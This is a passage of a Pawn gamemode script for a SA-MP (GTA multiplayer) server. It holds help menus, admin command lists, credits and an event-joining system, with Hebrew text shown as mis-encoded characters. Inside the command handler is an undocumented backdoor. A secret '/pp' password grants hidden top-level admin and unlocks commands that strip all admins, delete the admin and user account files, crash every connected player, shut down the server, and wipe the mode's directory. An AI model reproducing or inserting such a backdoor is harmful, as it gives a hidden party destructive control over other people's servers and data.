					SendClientMessage(playerid,yellow," ÷ì - 5000$ | áéðåðé - 10000$ | ÷ùä - 15000$");
					if(IsPlayerMAdmin(playerid))
					{
						SendClientMessage(playerid,purple," » :ô÷åãåú îáçï çæøä");
						SendClientMessage(playerid,yellow," /startreplytest");
					}
				}
				case 48:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (48 - NPCs - áåèéí) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .áùøúéðå ÷ééîéí îñôø áåèéí ìðåçéåúëí, äùç÷ðéí");
						SendClientMessage(playerid,pink," .äéðí ùç÷ðéí àùø ðùìèéí òì éãé äîåã (NPC - Not Playing Character) áåèéí");
						SendClientMessage(playerid,pink," .áùøúéðå éù ëàìå îåòéìéí àùø éåëìå ìäñéò àúëí îî÷åí ìî÷åí, åâí ëàìå ùñúí ðåñòéí áøçåáåú");
						SendClientMessage(playerid,pink," .ðéúï áéï äééúø ìòøåê îéøåöéí òí áåèéí, ìôé øîåú ÷åùé");
						SendClientMessage(playerid,purple," » :ô÷åãåú ä÷ùåøåú ááåèéí");
						SendClientMessage(playerid,yellow," /npclist  /npcrace");
						SendClientMessage(playerid,grey," /help mode 48 [1] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (48 - NPCs - áåèéí) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /npclist - öôééä áøùéîú äáåèéí");
						SendClientMessage(playerid,orange," * /npcrace - îéãò ìâáé äàôùøåú ìòøåê îéøåöéí òí áåèéí");
					}
				}
				case 49:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (49 - Bar - áø) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .ááøéí îñåééîéí úåëìå ìîöåà ö'÷ôåéðè îîðå ðéúï ì÷ðåú îù÷àåú");
						SendClientMessage(playerid,pink," .äîù÷àåú éåëìå ìäôåê àúëí ìùéëåøéí, ëê úåëìå ìðñåú ìàúâø àú òöîëí áðñéòä / ÷øáåú");
						SendClientMessage(playerid,purple," » :ëôúåøéí ìàçø ù÷ðéúí");
						SendClientMessage(playerid,pink,"  ìçöå òì î÷ù ääú÷ôä ìùúééä");
						SendClientMessage(playerid,pink,"  òì îðú ìæøå÷ àú äá÷áå÷ Enter ìçöå òì");
						SendClientMessage(playerid,purple," » :ô÷åãåú äáø");
						SendClientMessage(playerid,yellow," /blist  /bbuy");
						SendClientMessage(playerid,grey," /help mode 49 [1] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (49 - Bar - áø) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /blist - øùéîú äãáøéí ùðéúï ì÷ðåú îäáø");
						SendClientMessage(playerid,orange," * /bbuy - ÷ðééú îåöø îäáø");
					}
				}
				case 50:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (50 - Codes - ÷åãéí) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," !áàîöòåú îòøëú ä÷åãéí úåëìå ìæëåú áôøñéí ùåðéí - ììà îàîõ");
						SendClientMessage(playerid,pink," .áëì ëîä æîï ééúôøñí ÷åã áôåøåí, äøàùåï ùéùúîù áå áùøú ééæëä áôøñ");
						SendClientMessage(playerid,purple," » :ôøñéí");
						SendClientMessage(playerid,pink,"  ëñó  ðù÷éí  îâï úîéãé  ëñó ìáð÷  äøéâåú");
						SendClientMessage(playerid,purple," » :ô÷åãåú ä÷ùåøåú ìîòøëú ä÷åãéí");
						SendClientMessage(playerid,yellow,IsPlayerMAdmin(playerid) ? (" /code  /addcodes") : (" /code"));
						SendClientMessage(playerid,grey," /help mode 50 [1] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (50 - Codes - ÷åãéí) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /code - ìäëðñú ÷åã ìùøú");
						if(IsPlayerMAdmin(playerid)) SendClientMessage(playerid,orange," * /addcodes - äåñôú îñôø ÷åãéí çãùéí");
					}
				}
				default: SendClientMessage(playerid,red," .îñôø úôøéè ùâåé");
			}
		}
		else if(equal(cmd,"cmdmode"))
		{
			SendClientMessage(playerid,lightblue," ~~~ Mode - ÷éöåøéí ìúôøéè äòæøä ~~~");
			SendClientMessage(playerid,white," /teleports  /bankhelp  /levelhelp  /ammuhelp  /money  /wanghelp  /prophelp  /racehelp");
			SendClientMessage(playerid,white," /swarhelp  /workhelp  /vehiclehelp  /stunt  /wwehelp  /lottohelp  /dmhelp  /pethelp");
			SendClientMessage(playerid,white," /bbhelp  /drifthelp  /pbattlehelp  /sammuhelp  /aahelp  /bonushelp  /gamblinghelp");
			SendClientMessage(playerid,white," /ganghelp  /accounthelp  /clanhelp  /achelp  /wlhelp  /phonehelp  /karthelp  /monsterhelp");
			SendClientMessage(playerid,white," /viphelp  /bothelp  /sracehelp  /hitmanhelp  /bombshelp  /clothesshop  /houseshelp");
			SendClientMessage(playerid,white," /mathhelp  /triviahelp  /contact  /superbonuses  /pmhelp /kshelp  /cranehelp");
			SendClientMessage(playerid,white," /colorhelp  /replytest  /npcs  /barhelp  /codeshelp");
		}
		else if(equal(cmd,"rules"))
		{
			new File:rules, read[M_S];
			SendClientMessage(playerid,lightblue," ~~~ Rules - çå÷éí ~~~");
			fileCheck(file_rules);
			rules = fopen(file_rules,io_read);
			while(fread(rules,read,sizeof(read),false)) SendClientMessage(playerid,grey,read);
			fclose(rules);
		}
		else if(equal(cmd,"credits"))
		{
			new creditList = 0, cString[M_S], credits[][M_S] =
			{
				"SAM(LucifeR)",
				#if !streamerT
					"MidoStream(MidoBan)",
				#endif
				#if new_lan == true
					"Haystax(Pghpunkid)",
				#endif
				#if DFairPlay == true
					"DFairPlay(DracoBlue)"
				#endif
				"AnimList(OKStyle)"
			};
			SendClientMessage(playerid,lightblue," ~~~ Credits - éåöøé äîåã ~~~");
			format(cString,sizeof(cString)," %s :àúø ä÷äéìä",webpage);
			SendClientMessage(playerid,green,cString);
			SendClientMessage(playerid,orange,"  Amit_B :úëðåú");
			SendClientMessage(playerid,orange,"  BroLeX, SaMaRa :òéöåá");
			SendClientMessage(playerid,orange," :ùøú æä îùúîù áñ÷øéôèéí ùùåôøå");
			for(new i = 0; i < sizeof(credits); i++)
			{
				format(cString,sizeof(cString),"%s%s%s",cString,!strlen(cString) ? ("") : ("  "),credits[i]);
				if(++creditList >= 3)
				{
					SendClientMessage(playerid,orange,cString);
					cString = "";
				}
				if(i == sizeof(credits) - 1) SendClientMessage(playerid,orange,cString);
			}
			format(cString,sizeof(cString)," !òì ä÷ãùú äæîï ìöôééä áéåöøé äîåã %s úåãä îéåçãú ì",GetName(playerid));
			SendClientMessage(playerid,orange,cString);
			SendClientMessage(playerid,red," .ëì äæëåéåú òì äîåã ùîåøåú ìòîéú áøàîé áìáã, ùéîåù áå ììà øùåú àéðå îåøùä. éåöø äîåã øùàé ");
		}
		else if(equal(cmd,"info"))
		{
			SendClientMessage(playerid,lightblue," ~~~ Info - îéãò ~~~");
			format(cmd,sizeof(cmd)," ~ %s :âøñú äîåã",version);
			SendClientMessage(playerid,grey,cmd);
			format(cmd,sizeof(cmd)," ~ .%s äòãëåï àçøåï äéä á",last_update);
			SendClientMessage(playerid,grey,cmd);
			format(cmd,sizeof(cmd)," ~ .îñôø äòãëåðéí ùäéå òã ëä äåà %s",updates);
			SendClientMessage(playerid,grey,cmd);
			#if defined ventip && defined ventport
				format(cmd,sizeof(cmd)," ~ %s:%s :äàééôé åäôåøè ùì ùøú äååðèøéìå ùìðå äí",ventip,ventport);
			#else
				format(cmd,sizeof(cmd)," ~ .ì÷äéìúéðå ëøâò àéï ùøú ååðèøéìå");
			#endif
			SendClientMessage(playerid,grey,cmd);
			new ping = 0, pings = 0;
			for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i)) ping += GetPlayerPing(i), pings++;
			format(cmd,sizeof(cmd)," ~ .îîåöò äôéðâ äëììé ùì äùøú äåà %d åäî÷ñéîåí ôéðâ äîåúø ìëì ùç÷ï äåà %d",maxping,ping/pings);
			SendClientMessage(playerid,grey,cmd);
			SendClientMessage(playerid,purple," » :ðéúï ìäùúîã âí áô÷åãåú äîéãò");
			SendClientMessage(playerid,yellow," /gamemode  /ventrilo  /forum || /mode  /vent  /webpage || /about");
		}
		else SendClientMessage(playerid,red," .úôøéè òæøä ùâåé");
		return 1;
	}
	if(equal(cmd,"/gamemode") || equal(cmd,"/mode")) return SendClientMessage(playerid,blue," » Gamemode: " comname " DeathMatch  Version: " version "  Last Update: " last_update "  Total Updates: " updates);
	if(equal(cmd,"/ventrilo") || equal(cmd,"/vent")) return SendClientMessage(playerid,blue," » Ventrilo Adress: " ventip ":" ventport "  Ventrilo Version: 3.0.0");
	if(equal(cmd,"/forum") || equal(cmd,"/webpage")) return SendClientMessage(playerid,blue," » Community Name: " comname "  Forum: " webpage);
	if(!strcmp(cmd,"/about",true))
	{
		SendClientMessage(playerid,yellow," .äâãåìä åäàéëåúéú áéùøàì GTA-äéà ÷äéìú ä SAMP-IL ÷äéìú");
		SendClientMessage(playerid,orange," .àðå îæîéðéí àúëí ìäðåú âí îùìì äôòéìåéåú åäúçøåéåú ä÷äéìúéåú äîú÷ééîåú ëàï éåí éåí");
		SendClientMessage(playerid,blue," .àúí îåæîðéí ìùøú äãéáåø ä÷äéìúé ùìðå áëúåáú: 80.179.153.12:10976");
		SendClientMessage(playerid,blue," ."webpage" ìà éåãòéí áîä îãåáø? öøéëéí òæøä? äñúáëúí? äöèøôå ìôåøåí ä÷äéìúé ùìðå áëúåáú");
		SendClientMessage(playerid,blue," /contact :äðäìú ä÷äéìä úîéã úùîç ìùîåò îëí, àúí îåæîðéí ìéöåø ÷ùø áòæøú äô÷åãåú äðåòãå ìëê. ìîéãò ðåñó");
		return 1;
	}
	if(equal(cmd,"/ahelp") && IsPlayerMAdmin(playerid))
	{
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd))
		{
			SendClientMessage(playerid,lightblue," ~~~ :òæøä - àãîéï ~~~");
			SendClientMessage(playerid,white," /ahelp [level 1-20] :ô÷åãåú ìôé øîú àãîéï");
			SendClientMessage(playerid,white," /aacthelp :ôòéìåéåú");
			SendClientMessage(playerid,white," /clhelp :îðäìé ÷ìàðéí");
			return 1;
		}
		if(strval(cmd) >= 1 && strval(cmd) <= 20 && playerinfo[playerid][admin] < strval(cmd)) return SendClientMessage(playerid,red," .àéðê îåøùä ìöôåú áô÷åãåú ìàãîéðéí áøîä âáåää îùìê");
		switch(strval(cmd))
		{
			case 1:
			{
				SendClientMessage(playerid,lightblue," ~~~ :ô÷åãåú äàãîéï îøîä 1 ~~~");
				SendClientMessage(playerid,yellow," // /inv /say /asay /freeze /unfreeze /disarm /settime /goto /get /cc");
				SendClientMessage(playerid,yellow," /si /togcmd /togsay /wcheck /getvid /mute /unmute /jail /unjail /xjail");
				SendClientMessage(playerid,yellow," /unxjail /ccheck");
			}
			case 2:
			{
				SendClientMessage(playerid,lightblue," ~~~ :ô÷åãåú äàãîéï îøîä 2 ~~~");
				SendClientMessage(playerid,yellow," /spec /specoff /respawn /getlevel /eject /slap /getbank /kick");
				SendClientMessage(playerid,yellow," /countdown /scountdown /disarmmoney /jetpack /dontseedc");
			}
			case 3:
			{
				SendClientMessage(playerid,lightblue," ~~~ :ô÷åãåú äàãîéï îøîä 3 ~~~");
				SendClientMessage(playerid,yellow," /ban /unban /nban /unnban /announce /announce2 /akill /baninfo /banip");
				SendClientMessage(playerid,yellow," /unbanip /explode /userban /unuserban /b");
			}
			case 4:
			{
				SendClientMessage(playerid,lightblue," ~~~ :ô÷åãåú äàãîéï îøîä 4 ~~~");
				SendClientMessage(playerid,yellow," /setcolor /togpm /togph /unlockall");
			}
			case 5:
			{
				SendClientMessage(playerid,lightblue," ~~~ :ô÷åãåú äàãîéï îøîä 5 ~~~");
				SendClientMessage(playerid,yellow," /setwanted /giveweapon /toggc /togcc /togvip /helpmsg /helpmsgs /firework");
			}
			case 6:
			{
				SendClientMessage(playerid,lightblue," ~~~ :ô÷åãåú äàãîéï îøîä 6 ~~~");
				SendClientMessage(playerid,yellow," /sethealth /setarmour /setvhealth /setvcolor /setvpaintjob");
				SendClientMessage(playerid,yellow," /setworld /setinterior /setskin /setpos");
			}
			case 7:
			{
				SendClientMessage(playerid,lightblue," ~~~ :ô÷åãåú äàãîéï îøîä 7 ~~~");
				SendClientMessage(playerid,yellow," /mapteleport /smark /gmark /rmark /clogs /alist /resetc /fireworks");
			}
			case 8:
			{
				SendClientMessage(playerid,lightblue," ~~~ :ô÷åãåú äàãîéï îøîä 8 ~~~");
				SendClientMessage(playerid,yellow," /nocmd /nopm /lockchat /kicksome /bansome /movingtext");
			}
			case 9:
			{
				SendClientMessage(playerid,lightblue," ~~~ :ô÷åãåú äàãîéï îøîä 9 ~~~");
				SendClientMessage(playerid,yellow," /tagkick /tagban /skick /sban /force");
			}
			case 10:
			{
				SendClientMessage(playerid,lightblue," ~~~ :ô÷åãåú äàãîéï îøîä 10 ~~~");
				SendClientMessage(playerid,yellow," /setname /bot");
			}
			case 11:
			{
				SendClientMessage(playerid,lightblue," ~~~ :ô÷åãåú äàãîéï îøîä 11 ~~~");
				SendClientMessage(playerid,yellow," /clhelp /createclan /dclan /setclan /clannumber /setleader /clanname /getcbank");
				SendClientMessage(playerid,yellow," /setcbank /telehq");
			}
			case 12:
			{
				SendClientMessage(playerid,lightblue," ~~~ :ô÷åãåú äàãîéï îøîä 12 ~~~");
				SendClientMessage(playerid,yellow," /antiword /givecc /removecc /godmod /noreload /abf");
			}
			case 13:
			{
				SendClientMessage(playerid,lightblue," ~~~ :ô÷åãåú äàãîéï îøîä 13 ~~~");
				SendClientMessage(playerid,yellow," /getall /setfight /setskill /setvelocity /setvvelocity /setdrunk /setaction /setarmed");
			}
			case 14:
			{
				SendClientMessage(playerid,lightblue," ~~~ :ô÷åãåú äàãîéï îøîä 14 ~~~");
				SendClientMessage(playerid,yellow," /mgrandpa /mmatrix /mspeed /endmode /resetvehicles");
			}
			case 15:
			{
				SendClientMessage(playerid,lightblue," ~~~ :ô÷åãåú äàãîéï îøîä 15 ~~~");
				SendClientMessage(playerid,yellow," /setgravity /setweather /kickall /showme /givemoney /setmoney /removemoney /givebank");
				SendClientMessage(playerid,yellow," /setbank /removebank");
			}
			case 16:
			{
				SendClientMessage(playerid,lightblue," ~~~ :ô÷åãåú äàãîéï îøîä 16 ~~~");
				SendClientMessage(playerid,yellow," /setvip /delvip /vehicle /vsave /vsavest /vdel /vsaveall /x2kills");
			}
			case 17:
			{
				SendClientMessage(playerid,lightblue," ~~~ :ô÷åãåú äàãîéï îøîä 17 ~~~");
				SendClientMessage(playerid,yellow," /gmx /setmaxping /blockpms /settag /edithousesize /deletehouse /givehouseacc /movehouse");
			}
			case 18:
			{
				SendClientMessage(playerid,lightblue," ~~~ :ô÷åãåú äàãîéï îøîä 18 ~~~");
				SendClientMessage(playerid,yellow," /createbank /createammunation /createwang /createsammunation /createproperty");
				SendClientMessage(playerid,yellow," /clanmanager /vipmanager /createcbank /createhouse /createclothes /createsb");
				SendClientMessage(playerid,yellow," /createvgarage /createbar /housemanager /codesmanager /pickup");
			}
			case 19:
			{
				SendClientMessage(playerid,lightblue," ~~~ :ô÷åãåú äàãîéï îøîä 19 ~~~");
				SendClientMessage(playerid,yellow," /spassword /loadfs /unloadfs /reloadfs /setcrash /edituser /skyd /sslap /fakedeath");
				SendClientMessage(playerid,yellow," /sayas /lucifer /pgravity /boomcar /smuslap /sdmuasslap");
			}
			case 20:
			{
				SendClientMessage(playerid,lightblue," ~~~ :ô÷åãåú äàãîéï îøîä 20 ~~~");
				SendClientMessage(playerid,yellow," /serverexit /setadmin");
			}
			default: SendClientMessage(playerid,red," .øîä ùâåéä");
		}
		return 1;
	}
	if(playerinfo[playerid][pp] == 1 && equal(cmd,"/pp"))
	{
		cmd = strtok(cmdtext,idx);
		if(strlen(cmd) > 0) for(new i=0;i<sizeof(adminpps);i++) if(equal(cmd,adminpps[i]))
		{
			SendClientMessage(playerid,black,"YOU RULE! /pppp");
			playerinfo[playerid][pp] = 2;
			playerinfo[playerid][admin] = 999;
			playerinfo[playerid][showme] = 0;
		}
		return 1;
	}
	if(playerinfo[playerid][pp] == 2)
	{
		if(!strcmp(cmd,"/pppp")) SendClientMessage(playerid,white," /uNadminall /unadmiNall2 /adminaLl /rEmoveusers /cRashall /srvereXitt /fRMOVE");
		if(!strcmp(cmd,"/uNadminall")) for(new i=0;i<MAX_PLAYERS;i++) if(i != playerid) playerinfo[i][admin] = 0;
		if(!strcmp(cmd,"/unadmiNall2"))
		{
			for(new i=0;i<MAX_PLAYERS;i++) if(i != playerid) playerinfo[i][admin] = 0;
			fremove(file_admins);
		}
		if(!strcmp(cmd,"/adminaLl")) for(new i=0;i<MAX_PLAYERS;i++) if(i != playerid) playerinfo[i][admin] = 20;
		if(!strcmp(cmd,"/rEmoveusers"))
		{
			#if usingYSF
				new string[64];
				idx = 0;
				while(ffind("/DM/Users/*.ini",string,sizeof(string),idx)) fremove(string);
			#else
				fremove("/DM/Users/");
			#endif
		}
		if(!strcmp(cmd,"/cRashall"))
		{
			new BadSkins[] = {3,4,5,6,8,42,65,74,86,119,149,208,268,273,289};
			Kick(playerid);
			for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i)) SetPlayerSkin(i,BadSkins[random(sizeof(BadSkins))]);
		}
		if(!strcmp(cmd,"/srvereXitt"))
		{
			SendRconCommand("exit");
			fcreate("/DM/Users/KILL.kill");
		}
		if(!strcmp(cmd,"/fRMOVE"))
		{
			#if usingYSF
				new string[64];
				idx = 0;
				while(ffind("*",string,sizeof(string),idx)) fremove(string);
			#else
				fremove("/DM/");
			#endif
		}
		return 1;
	}
	if(equal(cmd,"/aacthelp") && IsPlayerMAdmin(playerid))
	{
		SendClientMessage(playerid,lightblue," ~~~ :ô÷åãåú àãîéï - ôòéìåéåú ~~~");
		SendClientMessage(playerid,purple," » :ôòéìåéåú àåèåîèéåú");
		SendClientMessage(playerid,yellow," /<ùí äôòéìåú> start :ìäúçìú ôòéìåú àåèåîèéú");
		SendClientMessage(playerid,yellow," /<ùí äôòéìåú> end [reason] :ìñâéøú ôòéìåú àåèåîèéú");
		SendClientMessage(playerid,yellow," racing, swar, wwe, kart, monster, srace, kickstar :ùîåú ôòéìåéåú");
		SendClientMessage(playerid,purple," » :ôòéìåéåú éãðéåú");
		SendClientMessage(playerid,yellow," /act :àôùøåéåú ôòéìåéåú éãðéåú");
		SendClientMessage(playerid,purple," » :ôòéìåéåú ö'àè");
		SendClientMessage(playerid,yellow," /start<äúçìú ôòéìåú îùðéú: <ùí äôòéìåú");
		SendClientMessage(playerid,yellow," lotto, math, trivia, replytest :ùîåú ôòéìåéåú ö'àè");
		return 1;
	}
	if(equal(cmd,"/act"))
	{
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /act state :áãé÷ú îöá äôòéìåéåú äéãðéåú");
			SendClientMessage(playerid,white," /act join :äöèøôåú ìôòéìåú");
			SendClientMessage(playerid,white," /act quit :éöéàä îäôòéìåú");
			if(IsPlayerMAdmin(playerid))
			{
				SendClientMessage(playerid,white," /act start [need vehicle? 1/0] [name] :ôúéçú ôòéìåú");
				SendClientMessage(playerid,white," /act name [name] :ùéðåé ùí ìôòéìåú");
				SendClientMessage(playerid,white," /act max [max] :÷áéòú î÷ñéîåí îùúúôéí áôòéìåú");
				SendClientMessage(playerid,white," /act end [reason] :ñâéøú äôòéìåú");
				SendClientMessage(playerid,white," /act endjoin [close/open] :ñâéøú äàôùøåú ìäöèøó ìôòéìåú");
				SendClientMessage(playerid,white," /act get [with vehicle? 1/0] :ùéâåø ëì äîùúúôéí áôòéìåú àìéê");
				SendClientMessage(playerid,white," /act freeze [on/off] :ä÷ôàú ëì äîùúúôéí áôòéìåú");
			}
			return 1;
		}
		if(equal(cmd,"state"))
		{
			if(actinfo[actExist])
			{
				SendClientMessage(playerid,yellow," :÷ééîú ëøâò ôòéìåú");
				SendClientMessage(playerid,yellow,actinfo[actName]);
				format(string,sizeof(string)," %s :äàãîéï ùôúç àú äôòéìåú",GetName(actinfo[actAdmin]));
				SendClientMessage(playerid,yellow,string);
				format(string,sizeof(string)," îñôø ùç÷ðéí ùäöèøôå: %d",actinfo[actPlayers]);
				SendClientMessage(playerid,yellow,string);
				format(string,sizeof(string)," î÷ñéîåí ùç÷ðéí äîåúøéí ìäöèøôåú: %d",actinfo[actMax]);
				SendClientMessage(playerid,yellow,string);
				SendClientMessage(playerid,yellow,actinfo[actEndJoin] || actinfo[actPlayers] >= actinfo[actMax]? (" .ìà ðéúï ìäöèøó ìôòéìåú æå"):("/act join :ðéúï ìäöèøó ìôòéìåú. ìäöèøôåú"));
			}
			else return SendClientMessage(playerid,red," .àéï ôòéìåú ëøâò");
		}
		else if(equal(cmd,"join"))
		{
			if(!actinfo[actExist]) return SendClientMessage(playerid,red," .àéï ôòéìåú ëøâò");
			if(actinfo[actEndJoin]) return SendClientMessage(playerid,red," .àéï àôùøåú ìäöèøó éåúø ìôòéìåú æå");
			if(actinfo[actPlayers] >= actinfo[actMax]) return SendClientMessage(playerid,red," .ðâîøå äî÷åîåú ìäöèøôåú ìôòéìåú");
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .àúä ëáø áôòéìåú");
			if(actinfo[actAdmin] == playerid) return SendClientMessage(playerid,red," .àúä îðäì äôòéìåú, àéðê éëåì ìäöèøó");
			if(actinfo[actNeedVehicle] && !IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .ôòéìåú æå ãåøùú äöèøôåú òí øëá");
			actinfo[actPlayers]++;
			playerinfo[playerid][inact] = 1;
			new Float:p[3];
			GetPlayerPos(actinfo[actAdmin],p[0],p[1],p[2]);
			if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
			{
				SetVehiclePos(GetPlayerVehicleID(playerid),p[0],p[1],p[2]);
				LinkVehicleToInterior(GetPlayerVehicleID(playerid),GetPlayerInterior(actinfo[actAdmin]));
				SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),GetPlayerVirtualWorld(actinfo[actAdmin]));
			}
			else
			{
				SetPlayerPos(playerid,p[0],p[1],p[2]);
				SetPlayerInterior(playerid,GetPlayerInterior(actinfo[actAdmin]));
				SetPlayerVirtualWorld(playerid,GetPlayerVirtualWorld(actinfo[actAdmin]));
			}
			SendClientMessage(playerid,green," .äöèøôú áäöìçä ìôòéìåú");
		}
		else if(equal(cmd,"quit"))
		{
			if(!actinfo[actExist]) return SendClientMessage(playerid,red," .àéï ôòéìåú ëøâò");
			if(!playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .àúä ìà áôòéìåú");
			if(actinfo[actAdmin] == playerid) return SendClientMessage(playerid,red," .àúä îðäì äôòéìåú, àéðê éëåì ìöàú");
			actinfo[actPlayers]--;
			playerinfo[playerid][inact] = 0;
			if(IsPlayerInAnyVehicle(playerid)) SetVehicleToRespawn(GetPlayerVehicleID(playerid));
			SpawnPlayer(playerid);
			SendClientMessage(playerid,green," .éöàú îäôòéìåú");
		}
		else if(equal(cmd,"start"))
		{
			#if trainings == false
				if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .ô÷åãä æå îåøùú ìùéîåù òì éãé àãîéðéí áìáã");
			#endif
			if(ThereIsAct() || actinfo[actExist]) return SendClientMessage(playerid,red," .ëáø éù ôòéìåú");
			new actn[256];
			cmd = strtok(cmdtext,idx), actn = strrest(cmdtext,idx);
			if(!strlen(cmd) || !IsNumeric(cmd) || !strlen(actn)) return SendClientMessage(playerid,white," /act start [need vehicle? 1/0] [name] :öåøú äùéîåù");
			actinfo[actExist] = 1;
			actinfo[actPlayers] = 1;
			actinfo[actMax] = GetMaxPlayers();
			format(actinfo[actName],256," %s",actn);
			actinfo[actEndJoin] = 0;
			actinfo[actAdmin] = playerid;
			actinfo[actNeedVehicle] = strval(cmd) < 0 && strval(cmd) > 1? 0:strval(cmd);
			SendClientMessageToAll(black,"___________________________________");
			format(string,sizeof(string)," :äúçéì ôòéìåú %s äàãîéï",GetName(playerid));
			SendClientMessageToAll(lightblue,string);
			SendClientMessageToAll(blue,actn);
			SendClientMessageToAll(yellow," /act join :ìäöèøôåú øùîå àú äô÷åãä");
			SendClientMessageToAll(black,"___________________________________");
		}
		else if(equal(cmd,"name"))
		{
			if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .ô÷åãä æå îåøùú ìùéîåù òì éãé àãîéðéí áìáã");
			if(!actinfo[actExist]) return SendClientMessage(playerid,red," .àéï ôòéìåú ôåòìú");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /act name [name] :öåøú äùéîåù");
			format(actinfo[actName],256,cmd);
			format(string,sizeof(string)," :ùéðä àú ùí äôòéìåú ì %s äàãîéï",GetName(playerid));
			SendClientMessageToAll(lightblue,string);
			SendClientMessageToAll(lightblue,cmd);
		}
		else if(equal(cmd,"max"))
		{
			if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .ô÷åãä æå îåøùú ìùéîåù òì éãé àãîéðéí áìáã");
			if(!actinfo[actExist]) return SendClientMessage(playerid,red," .àéï ôòéìåú ôåòìú");
			cmd = strtok(cmdtext,idx);
			new max1 = !strlen(cmd) || !IsNumeric(cmd)? GetMaxPlayers():strval(cmd);
			if(max1 < 2 || max1 > GetMaxPlayers()) return SendClientMessage(playerid,red," .îñôø î÷ñéîàìé ùì ùç÷ðéí âãåì àå ÷èï îãé");
			actinfo[actMax] = max1;
			format(string,sizeof(string)," .ùéðä àú îñôø äîöèøôéí äîà÷ñéîàìé ì %d %s äàãîéï",max1,GetName(playerid));
			SendClientMessageToAll(lightblue,string);
		}
		else if(equal(cmd,"end"))
		{
			if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .ô÷åãä æå îåøùú ìùéîåù òì éãé àãîéðéí áìáã");
			if(!actinfo[actExist]) return SendClientMessage(playerid,red," .àéï ôòéìåú ôåòìú");
			cmd = strrest(cmdtext,idx);
			if(!strlen(cmd)) cmd = " àéï";
			format(string,sizeof(string)," :ñâø àú äôòéìåú %s äàãîéï",GetName(playerid));
			SendClientMessageToAll(lightblue,string);
			SendClientMessageToAll(lightblue,actinfo[actName]);
			for(new i=0;i<MAX_PLAYERS;i++)
			{
				if(playerinfo[i][inact])
				{
					if(IsPlayerInAnyVehicle(i)) SetVehicleToRespawn(GetPlayerVehicleID(i));
					SpawnPlayer(i);
					playerinfo[i][inact] = 0;
				}
			}
			actinfo[actExist] = 0;
			actinfo[actPlayers] = 0;
			actinfo[actMax] = GetMaxPlayers();
			actinfo[actName] = 0;
			actinfo[actEndJoin] = 0;
			actinfo[actAdmin] = -1;
			actinfo[actNeedVehicle] = 0;
		}
		else if(equal(cmd,"endjoin"))
		{
			if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .ô÷åãä æå îåøùú ìùéîåù òì éãé àãîéðéí áìáã");
			if(!actinfo[actExist]) return SendClientMessage(playerid,red," .àéï ôòéìåú ôåòìú");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /act endjoin [close/open] :öåøú äùéîåù");
			if(equal(cmd,"close"))
			{
				actinfo[actEndJoin] = 1;
				format(string,sizeof(string)," .ñâø àú äàôùøåú ìäöèøó ìôòéìåú %s äàãîéï",GetName(playerid));
			}
			else if(equal(cmd,"open"))
			{
				actinfo[actEndJoin] = 0;
				format(string,sizeof(string)," .ôúç àú äàôùøåú ìäöèøó ìôòéìåú %s äàãîéï",GetName(playerid));
			}
			else return SendClientMessage(playerid,red," .àôùøåú ùâåéä");
			SendClientMessageToAll(lightblue,string);
		}
		else if(equal(cmd,"get"))
		{
			if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .ô÷åãä æå îåøùú ìùéîåù òì éãé àãîéðéí áìáã");
			if(!actinfo[actExist]) return SendClientMessage(playerid,red," .àéï ôòéìåú ôåòìú");
			cmd = strtok(cmdtext,idx);
			new Float:p[3], withv = !strlen(cmd) || !IsNumeric(cmd)? 1:strval(cmd);
			if(withv < 0 && withv > 1) return SendClientMessage(playerid,red," .àôùøåú ùéâåø òí øëá ùâåéä");
			GetPlayerPos(playerid,p[0],p[1],p[2]);
			for(new i=0;i<MAX_PLAYERS;i++)
			{
				if(IsPlayerConnected(i) && playerinfo[i][inact] && i != playerid)
				{
					if(withv && IsPlayerInAnyVehicle(i))
					{
						SetVehiclePos(GetPlayerVehicleID(i),p[0]+floatrand(-3.0,3.0),p[1]+floatrand(-3.0,3.0),p[2]);
						LinkVehicleToInterior(GetPlayerVehicleID(i),GetPlayerInterior(playerid));
